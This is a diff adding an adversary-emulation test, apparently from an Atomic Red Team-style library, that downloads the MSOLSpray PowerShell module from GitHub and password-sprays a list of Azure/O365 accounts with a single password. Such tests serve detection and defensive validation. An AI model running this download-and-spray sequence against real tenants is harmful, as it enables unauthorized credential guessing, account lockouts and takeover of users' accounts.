@@ -224,3 +224,31 @@ atomic_tests:
       Write-Host -ForegroundColor green "Finished"
       }
       Invoke-dpsLight "#{password}" $env:Temp\usersdpsLight.txt
+- name: Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)
+  description: |
+    This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    password:
+      description: Single password to try against the list of user accounts
+      type: String
+      default: P@ssword1
+    user_list:
+      description: File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)
+      type: String
+      default: $env:temp\T1110.003UserList.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      MSOLSpray module must exist in $env:temp.
+    prereq_command: |
+      if (test-path $env:temp\MSOLSpray.ps1){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1" -outfile "$env:temp\MSOLSpray.ps1"
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      import-module "$env:temp\MSOLSpray.ps1"
+      Invoke-MSOLSpray -UserList "#{user_list}" -Password "#{password}"
